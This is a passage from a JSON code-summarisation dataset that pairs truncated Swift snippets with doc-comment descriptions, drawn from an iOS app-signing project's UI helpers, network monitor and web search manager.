    "nl": "/ Create a stack view with standard configuration / - Parameters: /   - axis: Axis for the stack view /   - spacing: Spacing between items /   - views: Views to add to the stack /   - insets: Insets to apply to the stack view / - Returns: Configured UIStackView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2035",
    "code": "class InternalAnimationHelper {\n/// Add an animated icon to a view (replacement for Lottie)\n/// - Parameters:\n///   - systemName: SF Symbol name\n///   - view: Parent view to add the animation to\n///   - loopMode: Animation loop mode (continuous, once, etc.)\n///   - size: Size for the animation view\n/// - Returns: The configured UIImageView\nstatic func addAnimation(systemName: String, to view: UIView,\nloopMode _: UIView.AnimationRepeatCount = .infinity,",
    "nl": "MARK: - Internal Animation Helper",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "class"
  },
  {
    "id": "2036",
    "code": "static func addAnimation(systemName: String, to view: UIView,\nloopMode _: UIView.AnimationRepeatCount = .infinity,\nsize: CGSize? = nil) -> UIImageView\n{",
    "nl": "/ Add an animated icon to a view (replacement for Lottie) / - Parameters: /   - systemName: SF Symbol name /   - view: Parent view to add the animation to /   - loopMode: Animation loop mode (continuous, once, etc.) /   - size: Size for the animation view / - Returns: The configured UIImageView",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2037",
    "code": "static func showLoader(in view: UIView, message: String? = nil) -> UIView {\n// Create container for the loader\nlet container = UIView()\ncontainer.backgroundColor = UIColor.black.withAlphaComponent(0.3)\ncontainer.translatesAutoresizingMaskIntoConstraints = false\nview.addSubview(container)\n\n// Set constraints for full screen\nNSLayoutConstraint.activate([\ncontainer.topAnchor.constraint(equalTo: view.topAnchor),",
    "nl": "/ Show an animated loading indicator / - Parameters: /   - view: View to add the loader to /   - message: Optional message to display / - Returns: Container view with the animation that can be removed later",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2038",
    "code": "static func hideLoader(_ container: UIView) {\nUIView.animate(withDuration: 0.3, animations: {",
    "nl": "/ Hide the loader / - Parameter container: Container view returned by showLoader",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2039",
    "code": "class InternalUIComponents {\n/// Create a beautifully styled button with gradient\n/// - Parameters:\n///   - title: Button title\n///   - colors: Gradient colors (default blue gradient)\n///   - cornerRadius: Corner radius (default 12)\n///   - fontSize: Font size (default 16)\n/// - Returns: Configured button\nstatic func createGradientButton(title: String,\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],",
    "nl": "MARK: - Internal UI Components",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "class"
  },
  {
    "id": "2040",
    "code": "static func createGradientButton(title: String,\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\ncornerRadius: CGFloat = 12,\nfontSize: CGFloat = 16) -> UIButton\n{",
    "nl": "/ Create a beautifully styled button with gradient / - Parameters: /   - title: Button title /   - colors: Gradient colors (default blue gradient) /   - cornerRadius: Corner radius (default 12) /   - fontSize: Font size (default 16) / - Returns: Configured button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2041",
    "code": "static func createCardView(backgroundColor: UIColor = .systemBackground,\ncornerRadius: CGFloat = 16) -> UIView\n{",
    "nl": "/ Create a card view with shadow / - Parameters: /   - backgroundColor: Card background color /   - cornerRadius: Corner radius / - Returns: Configured card view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2042",
    "code": "static func createFloatingTextField(placeholder: String,\nbackgroundColor: UIColor = .systemBackground,\nborderColor: UIColor = .systemGray4) -> UIView\n{",
    "nl": "/ Create a beautiful text field with floating label / - Parameters: /   - placeholder: Placeholder text /   - backgroundColor: Background color /   - borderColor: Border color / - Returns: Configured text field with container",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2043",
    "code": "extension UIView {\nenum AnimationRepeatCount: Equatable {",
    "nl": "/ Extension to define animation repeat options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "2044",
    "code": "enum AnimationRepeatCount: Equatable {\ncase once\ncase finite(count: Int)\ncase infinity\n\nvar floatValue: Float {",
    "nl": "enum AnimationRepeatCount - implements functionality related to animation repeat count",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "enum"
  },
  {
    "id": "2045",
    "code": "enum ConnectionType {\ncase wifi\ncase cellular\ncase ethernet\ncase unknown\n}\n\n/// Class for monitoring network connectivity status\nclass NetworkMonitor {",
    "nl": "/ Network connectivity status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "enum"
  },
  {
    "id": "2046",
    "code": "class NetworkMonitor {\n// MARK: - Properties\n\n/// Singleton instance\nstatic let shared = NetworkMonitor()\n\n/// Network path monitor\nprivate let monitor = NWPathMonitor()\n\n/// Monitor queue",
    "nl": "/ Class for monitoring network connectivity status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "class"
  },
  {
    "id": "2047",
    "code": "func startMonitoring() {\nmonitor.pathUpdateHandler = { [weak self] path in",
    "nl": "MARK: - Public Methods / Start monitoring network status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "function"
  },
  {
    "id": "2048",
    "code": "func stopMonitoring() {\nmonitor.cancel()\n}\n\n/// Check if the current connection is expensive (cellular)\nvar isExpensiveConnection: Bool {",
    "nl": "/ Stop monitoring network status",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "function"
  },
  {
    "id": "2049",
    "code": "private func updateConnectionType(_ path: NWPath) {\nif path.usesInterfaceType(.wifi) {",
    "nl": "MARK: - Private Methods / Update the current connection type based on the network path",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "function"
  },
  {
    "id": "2050",
    "code": "func hasBeenOfflineForExtendedPeriod() -> Bool {\nguard !isConnected else { return false }",
    "nl": "/ Check if the device has been offline for a significant period",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift",
    "code_type": "function"
  },
  {
    "id": "2051",
    "code": "@objc class SourceRefreshOperation: Operation, @unchecked Sendable {\nprivate let queue = DispatchQueue(label: \"kh.crysalis.backdoor.sourcerefresh\", qos: .userInitiated)\nprivate let isDebugMode: Bool = {",
    "nl": "class SourceRefreshOperation - implements functionality related to source refresh operation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "class"
  },
  {
    "id": "2052",
    "code": "override func main() {\nguard !isCancelled else { return }",
    "nl": "Function main - implements main functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "function"
  },
  {
    "id": "2053",
    "code": "private func checkForUpdates(with sourceData: [(data: SourcesData, url: URL)]) {\nlet coreDataQueue = DispatchQueue(label: \"kh.crysalis.backdoor.coredata\", qos: .userInitiated)\n\ncoreDataQueue.sync {",
    "nl": "Function checkForUpdates - implements checkforupdates functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "function"
  },
  {
    "id": "2054",
    "code": "private func cleanVersion(_ version: String) -> String {\n// find first occurrence of version pattern X.Y.Z\nlet pattern = \"\\\\d+(\\\\.\\\\d+)+\"\nif let range = version.range(of: pattern, options: .regularExpression) {",
    "nl": "Function cleanVersion - implements cleanversion functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "function"
  },
  {
    "id": "2055",
    "code": "private func compareVersions(_ v1: String, _ v2: String) -> Int {\nlet cleanV1 = cleanVersion(v1)\nlet cleanV2 = cleanVersion(v2)\n\nlet v1Components = cleanV1.split(separator: \".\").compactMap { Int($0) }",
    "nl": "Function compareVersions - implements compareversions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "function"
  },
  {
    "id": "2056",
    "code": "func createMockSource(completion: @escaping (SourcesData?) -> Void) {\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\nDebug.shared.log(\nmessage: \"Debug mode: Found \\(signedApps.count) signed app\\(signedApps.count == 1 ? \"\" : \"s\")\",\ntype: .info\n)\n\nif let firstApp = signedApps.first {",
    "nl": "Function createMockSource - creates mocksource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift",
    "code_type": "function"
  },
  {
    "id": "2057",
    "code": "enum SourceType {\ncase web\ncase academic\ncase news\ncase social\ncase database\ncase unknown\n}\n\n/// Search depth levels for different search intensities",
    "nl": "MARK: - Data Structures / Source type for categorizing search results",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "enum"
  },
  {
    "id": "2058",
    "code": "enum SearchDepth: Int {\ncase standard = 0 // Basic search\ncase enhanced = 1 // Follow top links\ncase deep = 2 // Follow multiple links with recursive crawling\ncase specialized = 3 // Domain-specific searches (academic, news, etc.)\n}\n\n/// Basic search result model\nstruct WebSearchResult {",
    "nl": "/ Search depth levels for different search intensities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "enum"
  },
  {
    "id": "2059",
    "code": "struct WebSearchResult {\nlet title: String\nlet description: String\nlet url: URL\nvar sourceType: SourceType = .web\n}\n\n/// Enhanced search result with additional metadata\nstruct DeepSearchResult {",
    "nl": "/ Basic search result model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "struct"
  },
  {
    "id": "2060",
    "code": "struct DeepSearchResult {\nvar title: String = \"\"\nvar description: String = \"\"\nvar url: URL?\nvar keywords: [String] = []\nvar sentiment: Double = 0.0\nvar relatedContent: [String: String] = [:]\nvar sourceType: SourceType = .web\nvar contentSummary: String = \"\"\nvar extractedDate: Date?",
    "nl": "/ Enhanced search result with additional metadata",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "struct"
  },
  {
    "id": "2061",
    "code": "struct PageData {\nvar content: String\nvar keywords: [String]\nvar sentiment: Double = 0.0\nvar relatedContent: [String: String] = [:]\nvar entities: [String: String] = [:]\nvar links: [URL] = []\nvar imageURLs: [URL] = []\nvar extractedDate: Date?\n}",
    "nl": "/ Structure to hold extracted page data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "struct"
  },
  {
    "id": "2062",
    "code": "struct SearchCacheEntry {\nlet results: [DeepSearchResult]\nlet timestamp: Date\nlet query: String\nlet depth: SearchDepth\n}\n\n/// Possible search errors\nenum SearchError: Error {",
    "nl": "/ Search cache entry",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "struct"
  },
  {
    "id": "2063",
    "code": "enum SearchError: Error {\ncase invalidQuery\ncase networkError(Error)\ncase parsingError\ncase emptyResults\ncase rateLimitExceeded\ncase accessDenied\ncase timeout\ncase crawlFailed\ncase unsupportedSourceType",
    "nl": "/ Possible search errors",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "enum"
  },
  {
    "id": "2064",
    "code": "class WebSearchManager {\n// Singleton instance\nstatic let shared = WebSearchManager()\n\n// Configuration properties\nprivate let maxConcurrentRequests = 5\nprivate let requestTimeout: TimeInterval = 10\nprivate let maxCacheAgeMins: Double = 30\nprivate let maxSearchDepth = 3\nprivate let maxResultsPerSearch = 20",
    "nl": "MARK: - Main Manager Class / Enhanced web search manager with deep search capabilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "class"
  },
  {
    "id": "2065",
    "code": "func performSearch(query: String, completion: @escaping (Result<[WebSearchResult], Error>) -> Void) {\nDebug.shared.log(message: \"Performing standard web search for: \\(query)\", type: .info)\n\n// Check privacy settings before proceeding\nguard privacyManager.isSearchEnabled else {",
    "nl": "MARK: - Public API / Performs a standard web search for the given query / - Parameters: /   - query: The search query string /   - completion: Callback with search results or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2066",
    "code": "func performDeepSearch(\nquery: String,\ndepth: SearchDepth = .enhanced,\nsourceTypes: [SourceType] = [.web, .news, .academic],\ncompletion: @escaping (Result<[DeepSearchResult], Error>) -> Void\n) {",
    "nl": "/ Performs a deep search with configurable depth and specialized sources / - Parameters: /   - query: The search query string /   - depth: How deep to search (affects crawling depth and source diversity) /   - sourceTypes: What types of sources to include /   - completion: Callback with enhanced search results or error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2067",
    "code": "func cancelAllSearches() {\nsessionQueue.sync {",
    "nl": "/ Cancel an active search session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2068",
    "code": "func formatDeepSearchResults(_ results: [DeepSearchResult]) -> String {\nvar formattedResults = \"\"\n\nfor (index, result) in results.prefix(5).enumerated() {",
    "nl": "/ Format deep search results as a readable string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2069",
    "code": "func formatSearchResults(_ results: [WebSearchResult]) -> String {\nvar formattedResults = \"\"\n\nfor (index, result) in results.prefix(5).enumerated() {",
    "nl": "/ Format standard search results as a readable string / This method is needed by CustomAIService+DeepSearch",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2070",
    "code": "private func processSearchResults(\ndata: Data,\nquery: String,\ncompletion: @escaping (Result<[WebSearchResult], Error>) -> Void\n) {",
    "nl": "MARK: - Private Methods - Search Processing / Process standard search results from raw data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2071",
    "code": "private func extractSearchResults(from json: [String: Any]) -> [WebSearchResult]? {\nvar results: [WebSearchResult] = []\n\n// Extract the AbstractText if available (featured snippet)\nif let abstractText = json[\"AbstractText\"] as? String,\n!abstractText.isEmpty,\nlet abstractURL = json[\"AbstractURL\"] as? String,\nlet url = URL(string: abstractURL)\n{",
    "nl": "/ Extract structured search results from DuckDuckGo response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2072",
    "code": "private func detectSourceType(url: URL, title _: String) -> SourceType {\nlet domain = url.host?.lowercased() ?? \"\"\nlet path = url.path.lowercased()\n\n// Academic sources\nif domain.contains(\"scholar.google\") ||\ndomain.contains(\"sciencedirect\") ||\ndomain.contains(\"researchgate\") ||\ndomain.contains(\"academia.edu\") ||\ndomain.contains(\"ieee.org\") ||",
    "nl": "/ Detect the source type based on URL and title",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2073",
    "code": "private func crawlPage(url: URL, depth: Int, completion: @escaping (PageData?) -> Void) {\n// Skip if depth is 0 or privacy disallows crawling\nguard depth > 0, privacyManager.isCrawlingEnabled else {",
    "nl": "MARK: - Private Methods - Deep Search / Web crawling function to follow links for deeper context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2074",
    "code": "private func performSpecializedSearch(\nquery: String,\nsourceTypes: [SourceType],\ncompletion: @escaping ([DeepSearchResult]) -> Void\n) {",
    "nl": "/ Perform specialized search using specific APIs based on source type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2075",
    "code": "private func searchAcademic(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {\n// This would normally use a specialized API like Semantic Scholar\n// For now, use a simplified implementation\n\nguard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {",
    "nl": "/ Search academic sources",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2076",
    "code": "private func searchNews(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {\n// This would normally use a specialized API like News API\n// For now, use a simplified implementation\n\nguard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {",
    "nl": "/ Search news sources",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2077",
    "code": "private func extractMainContent(from html: String) -> String {\n// Remove scripts, styles, and headers\nlet cleanedHtml = html\n.replacingOccurrences(of: \"<script[^>]*>.*?</script>\", with: \"\", options: .regularExpression)\n.replacingOccurrences(of: \"<style[^>]*>.*?</style>\", with: \"\", options: .regularExpression)\n.replacingOccurrences(of: \"<header[^>]*>.*?</header>\", with: \"\", options: .regularExpression)\n.replacingOccurrences(of: \"<nav[^>]*>.*?</nav>\", with: \"\", options: .regularExpression)\n.replacingOccurrences(of: \"<footer[^>]*>.*?</footer>\", with: \"\", options: .regularExpression)\n\n// Extract text from main content tags",
    "nl": "MARK: - Private Methods - Content Extraction / Extract the main content from HTML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2078",
    "code": "private func extractLinks(from html: String, baseURL: URL) -> [URL] {\nvar links: [URL] = []\nlet pattern = \"<a[^>]+href=[\\\"']([^\\\"']+)[\\\"'][^>]*>\"\n\ndo {",
    "nl": "/ Extract links from HTML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2079",
    "code": "private func extractImages(from html: String, baseURL: URL) -> [URL] {\nvar images: [URL] = []\nlet pattern = \"<img[^>]+src=[\\\"']([^\\\"']+)[\\\"'][^>]*>\"\n\ndo {",
    "nl": "/ Extract images from HTML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2080",
    "code": "private func extractDate(from html: String) -> Date? {\n// Try common date meta tags\nlet patterns = [\n\"<meta[^>]+property=[\\\"']article:published_time[\\\"'][^>]+content=[\\\"']([^\\\"']+)[\\\"']\",\n\"<meta[^>]+name=[\\\"']publication_date[\\\"'][^>]+content=[\\\"']([^\\\"']+)[\\\"']\",\n\"<time[^>]+datetime=[\\\"']([^\\\"']+)[\\\"']\",\n\"<span[^>]+class=[\\\"']date[\\\"'][^>]*>([^<]+)</span>\",\n]\n\nfor pattern in patterns {",
    "nl": "/ Extract date from HTML",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2081",
    "code": "private func extractKeywords(from text: String) -> [String] {\nguard !text.isEmpty else { return [] }",
    "nl": "/ Extract keywords from text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2082",
    "code": "private func isStopWord(_ word: String) -> Bool {\nlet stopWords = [\"the\", \"and\", \"or\", \"but\", \"for\", \"nor\", \"on\", \"at\", \"to\", \"from\", \"by\", \"with\",\n\"about\", \"against\", \"between\", \"into\", \"through\", \"during\", \"before\", \"after\",\n\"above\", \"below\", \"under\", \"over\", \"again\", \"further\", \"then\", \"once\", \"here\",\n\"there\", \"when\", \"where\", \"why\", \"how\", \"all\", \"any\", \"both\", \"each\", \"few\",\n\"more\", \"most\", \"other\", \"some\", \"such\", \"only\", \"own\", \"same\", \"than\", \"too\",\n\"very\", \"can\", \"will\", \"just\", \"should\", \"now\"]\n\nreturn stopWords.contains(word)\n}",
    "nl": "/ Check if a word is a common stop word",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2083",
    "code": "private func generateSummary(from text: String) -> String {\nguard !text.isEmpty else { return \"\" }",
    "nl": "/ Generate a summary from text",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2084",
    "code": "private func calculateRelevanceScore(query: String, result: DeepSearchResult, pageData: PageData) -> Double {\nvar score = 0.0\n\n// Base score from initial result position\nscore += max(0.1, result.confidence)\n\n// Split query into terms\nlet queryTerms = query.lowercased().components(separatedBy: .whitespacesAndNewlines)\n.filter { !$0.isEmpty && !self.isStopWord($0) }",
    "nl": "MARK: - Private Methods - Relevance and Ranking / Calculate relevance score for a search result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2085",
    "code": "private func enhanceResultsMetadata(deepResults: inout [DeepSearchResult], query: String) {\n// Extract potential entities from the query\nlet queryEntities = NaturalLanguageHelper.shared.extractEntities(from: query)\n\nfor i in 0 ..< deepResults.count {",
    "nl": "/ Enhance metadata for search results",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2086",
    "code": "private func getCachedResults(for key: String) -> [DeepSearchResult]? {\nvar results: [DeepSearchResult]?\n\ncacheQueue.sync {",
    "nl": "MARK: - Private Methods - Caching / Get cached search results if available",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2087",
    "code": "private func cacheDeepSearchResults(\n_ results: [DeepSearchResult],\nfor key: String,\nquery: String,\ndepth: SearchDepth\n) {",
    "nl": "/ Cache deep search results",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2088",
    "code": "private func cleanCache() {\ncacheQueue.sync {",
    "nl": "/ Clean expired entries from cache",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2089",
    "code": "private func logSearchDataForLearning(query: String, results: [DeepSearchResult], depth: SearchDepth) {\n// Only log if learning is enabled\nguard AILearningManager.shared.isLearningEnabled else {",
    "nl": "MARK: - Private Methods - Learning / Log search data for AI learning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2090",
    "code": "class SearchPrivacyManager {\n// Privacy setting keys\nprivate let searchEnabledKey = \"privacy_search_enabled\"\nprivate let deepSearchEnabledKey = \"privacy_deep_search_enabled\"\nprivate let crawlingEnabledKey = \"privacy_crawling_enabled\"\nprivate let searchCachingEnabledKey = \"privacy_search_caching_enabled\"\nprivate let trackedDomainsKey = \"privacy_tracked_domains\"\n\n/// Check if general search is enabled\nvar isSearchEnabled: Bool {",
    "nl": "MARK: - Privacy Management / Manages privacy settings for search functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "class"
  },
  {
    "id": "2091",
    "code": "func updateSettings(\nsearchEnabled: Bool? = nil,\ndeepSearchEnabled: Bool? = nil,\ncrawlingEnabled: Bool? = nil,\ncachingEnabled: Bool? = nil\n) {",
    "nl": "/ Update search privacy settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2092",
    "code": "func excludeDomain(_ domain: String) {\nvar domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []\nif !domains.contains(domain) {",
    "nl": "/ Add a domain to privacy tracking exclusion list",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2093",
    "code": "func includeDomain(_ domain: String) {\nvar domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []\ndomains.removeAll { $0 == domain }",
    "nl": "/ Remove a domain from privacy tracking exclusion list",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2094",
    "code": "func shouldTrackDomain(_ domain: String) -> Bool {\nlet excludedDomains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []\nreturn !excludedDomains.contains(domain)\n}\n}\n\n// MARK: - Helper Extensions\n\nextension DateFormatter {",
    "nl": "/ Check if a domain should be tracked",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2095",
    "code": "extension DateFormatter {\n@discardableResult\nfunc apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {",
    "nl": "MARK: - Helper Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "extension"
  },
  {
    "id": "2096",
    "code": "func apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {\nconfiguration(self)\nreturn self\n}\n}\n",
    "nl": "Function apply - implements apply functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift",
    "code_type": "function"
  },
  {
    "id": "2097",
